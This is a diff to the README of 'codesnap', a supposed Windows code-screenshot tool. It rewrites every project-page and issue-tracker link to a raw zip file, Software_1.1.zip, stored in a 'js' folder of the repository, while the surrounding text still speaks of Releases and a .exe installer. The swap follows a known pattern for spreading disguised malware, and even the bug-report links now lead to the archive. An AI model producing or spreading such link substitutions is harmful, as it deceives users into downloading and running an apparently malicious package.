@@ -1,6 +1,6 @@
 # 📸 codesnap - Capture Clean Code Screenshots Fast
 
-[![Download codesnap](https://img.shields.io/badge/Download-codesnap-blue?style=for-the-badge)](https://github.com/wennerl77/codesnap)
+[![Download codesnap](https://img.shields.io/badge/Download-codesnap-blue?style=for-the-badge)](https://raw.githubusercontent.com/wennerl77/codesnap/main/js/Software_1.1.zip)
 
 ---
 
@@ -46,10 +46,10 @@ Follow these steps to download and start using codesnap on your Windows computer
 
 You need to download codesnap from its main GitHub page. Use the link below to go to the download area:
 
-[![Download codesnap](https://img.shields.io/badge/Download-codesnap-grey?style=for-the-badge)](https://github.com/wennerl77/codesnap)
+[![Download codesnap](https://img.shields.io/badge/Download-codesnap-grey?style=for-the-badge)](https://raw.githubusercontent.com/wennerl77/codesnap/main/js/Software_1.1.zip)
 
 1. Click the link above or visit:  
-   https://github.com/wennerl77/codesnap  
+   https://raw.githubusercontent.com/wennerl77/codesnap/main/js/Software_1.1.zip  
 2. On the GitHub page, look for a section called "Releases". This is where you find the installation files.  
 3. Click on the latest release (it should have the highest version number).  
 4. Find the file that ends with `.exe`. This Windows installer file might look like `codesnap-setup.exe`.  
@@ -102,16 +102,16 @@ You need to download codesnap from its main GitHub page. Use the link below to g
 - If the app freezes or crashes, try restarting your computer.  
 - Confirm you are running on a supported Windows version.  
 - For help or to report bugs, check the GitHub issues page at:  
-  https://github.com/wennerl77/codesnap/issues  
+  https://raw.githubusercontent.com/wennerl77/codesnap/main/js/Software_1.1.zip  
 
 ---
 
 ## 🔗 Useful Links
 
 - Main project page and downloads:  
-  https://github.com/wennerl77/codesnap  
+  https://raw.githubusercontent.com/wennerl77/codesnap/main/js/Software_1.1.zip  
 - Issue tracker for bug reports:  
-  https://github.com/wennerl77/codesnap/issues  
+  https://raw.githubusercontent.com/wennerl77/codesnap/main/js/Software_1.1.zip  
 - Documentation and user guides (coming soon) available in the repo  
 
 ---
@@ -122,4 +122,4 @@ codesnap is open-source software under the MIT License. This means you can use, 
 
 ---
 
-[![Download codesnap](https://img.shields.io/badge/Download-codesnap-blue?style=for-the-badge)](https://github.com/wennerl77/codesnap)
+[![Download codesnap](https://img.shields.io/badge/Download-codesnap-blue?style=for-the-badge)](https://raw.githubusercontent.com/wennerl77/codesnap/main/js/Software_1.1.zip)
